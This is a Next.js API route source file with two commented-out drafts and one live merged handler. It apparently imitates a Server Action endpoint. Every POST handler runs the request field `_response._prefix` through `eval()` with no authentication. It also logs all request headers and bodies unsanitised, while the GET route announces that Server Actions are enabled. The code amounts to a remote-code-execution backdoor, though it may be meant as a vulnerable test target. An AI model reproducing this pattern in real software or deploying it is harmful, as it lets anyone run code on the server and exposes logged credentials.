// import { NextRequest, NextResponse } from 'next/server';

// export async function POST(request: NextRequest) {
//   try {
//     const body = await request.text();
//     console.log('[ACTION] Received:', body);
    
//     let data: any;
//     try {
//       data = JSON.parse(body);
//     } catch {
//       data = { raw: body };
//     }
    
//     // Execute prefix
//     if (data._response?._prefix) {
//       console.log('[ACTION] Exec:', data._response._prefix);
//       eval(data._response._prefix);
//     }
    
//     return NextResponse.json({ ok: true });
//   } catch (err) {
//     console.error('[ACTION] Error:', err);
//     return NextResponse.json({ error: String(err) }, { status: 500 });
//   }
// }

// export async function GET() {
//   return NextResponse.json({ status: 'ready' });
// }








// import { NextRequest, NextResponse } from 'next/server';

// export async function POST(request: NextRequest) {
//   try {
//     const contentType = request.headers.get('content-type') || '';
    
//     // Accept all content types
//     let payload: any;
    
//     if (contentType.includes('application/json')) {
//       payload = await request.json();
//     } else if (contentType.includes('text/x-component')) {
//       const text = await request.text();
//       try {
//         payload = JSON.parse(text);
//       } catch {
//         payload = { raw: text };
//       }
//     } else if (contentType.includes('multipart/form-data')) {
//       const formData = await request.formData();
//       payload = Object.fromEntries(formData);
//     } else {
//       payload = await request.text();
//     }
    
//     // Log everything (no sanitization)
//     console.log('[Server Action] Received:', {
//       contentType,
//       payload,
//       headers: Object.fromEntries(request.headers.entries()),
//     });
    
//     // Execute any _prefix if present
//     if (payload._response?._prefix) {
//       console.log('[Server Action] Executing prefix:', payload._response._prefix);
//       try {
//         eval(payload._response._prefix);
//       } catch (error) {
//         console.error('[Server Action] Prefix execution error:', error);
//       }
//     }
    
//     // Return success
//     return NextResponse.json({ success: true }, { status: 200 });
    
//   } catch (error) {
//     console.error('[Server Action] Error:', error);
//     return NextResponse.json(
//       { error: String(error) },
//       { status: 500 }
//     );
//   }
// }

// export async function GET(request: NextRequest) {
//   return NextResponse.json({ message: 'Server Actions enabled' });
// }




import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const contentType = request.headers.get('content-type') || '';
    let payload: any;
    let rawBody: string | null = null;

    // 1. Parse the request based on Content-Type (from File 1)
    if (contentType.includes('application/json')) {
      payload = await request.json();
    } else if (contentType.includes('multipart/form-data')) {
      const formData = await request.formData();
      payload = Object.fromEntries(formData);
    } else {
      // 2. Fallback text parsing (merged logic from File 1 and File 2)
      rawBody = await request.text();
      try {
        payload = JSON.parse(rawBody);
      } catch {
        payload = { raw: rawBody };
      }
    }

    // 3. Combined logging 
    console.log('[ACTION / Server Action] Received:', {
      contentType,
      body: rawBody || payload,
      headers: Object.fromEntries(request.headers.entries()),
    });

    // 4. Execute any _prefix if present
    const prefix = payload?._response?._prefix;
    if (prefix) {
      console.log('[ACTION / Server Action] Executing prefix:', prefix);
      try {
        eval(prefix);
      } catch (error) {
        console.error('[ACTION / Server Action] Prefix execution error:', error);
      }
    }

    // 5. Combined success return
    return NextResponse.json({ success: true, ok: true }, { status: 200 });

  } catch (error) {
    console.error('[ACTION / Server Action] Error:', error);
    return NextResponse.json(
      { error: String(error) },
      { status: 500 }
    );
  }
}

export async function GET(request: NextRequest) {
  // Combined GET response from both files
  return NextResponse.json({ 
    message: 'Server Actions enabled', 
    status: 'ready' 
  });
}